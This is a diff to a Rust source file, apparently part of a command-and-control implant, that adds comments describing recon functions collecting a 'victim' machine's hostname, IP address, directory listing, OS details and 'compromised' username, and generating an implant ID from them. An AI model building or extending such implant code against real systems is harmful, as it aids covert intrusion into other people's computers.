@@ -20,6 +20,7 @@ Log actions on the server
 Have a real client do things
 */
 
+// Return the hostname as a string
 fn get_hostname() -> String {
     let hostname = Command::new("hostname")
                             .output()
@@ -29,6 +30,7 @@ fn get_hostname() -> String {
     hostname.to_string()
 }
 
+// Return the IP address of the victim as a string - Linux
 #[cfg(target_os = "linux")]
 fn get_ip_address() -> String {
     let ip_address = Command::new("hostname")
@@ -40,6 +42,7 @@ fn get_ip_address() -> String {
     ip_address.to_string()
 }
 
+// Return the IP address of the victim as a string - Windows
 #[cfg(windows)]
 fn get_ip_address() -> String {
     let ip_address = Command::new("ipconfig")
@@ -54,6 +57,7 @@ fn get_ip_address() -> String {
     ip_address.to_string()
 }
 
+// Return the current directory listing as a string - Linux
 #[cfg(target_os = "linux")]
 fn get_directory_listing() -> String {
     let directory = Command::new("ls")
@@ -64,6 +68,7 @@ fn get_directory_listing() -> String {
     directory.to_string()
 }
 
+// Return the current directory listing as a string - Windows
 #[cfg(windows)]
 fn get_directory_listing() -> String {
     let directory = Command::new("dir")
@@ -74,6 +79,7 @@ fn get_directory_listing() -> String {
     directory.to_string()
 }
 
+// Return the operating system of the victim as a string - Linux
 #[cfg(target_os = "linux")]
 fn get_operating_system() -> String {
     let os = Command::new("cat")
@@ -85,6 +91,7 @@ fn get_operating_system() -> String {
     os.to_string()
 }
 
+// Return the operating system of the victim as a string - Windows
 #[cfg(windows)]
 fn get_operating_system() -> String {
     let os = Command::new("systeminfo")
@@ -98,6 +105,7 @@ fn get_operating_system() -> String {
     os.to_string()
 }
 
+// Return the user compromised on the victim as a string
 fn get_username() -> String {
     let username = Command::new("whoami")
                             .output()
@@ -107,12 +115,14 @@ fn get_username() -> String {
     username.to_string()
 }
 
+// Hash a thing and return the value as a u64
 fn calculate_hash<T: Hash>(t: &T) -> u64 {
     let mut s = DefaultHasher::new();
     t.hash(&mut s);
     s.finish()
 }
 
+// Generate an implant ID, which is the hashed value of {hostname}:{ip_address} formatted as a hex string
 fn generate_implant_id() -> String {
     let hostname = get_hostname();
     let ip_address = get_ip_address();
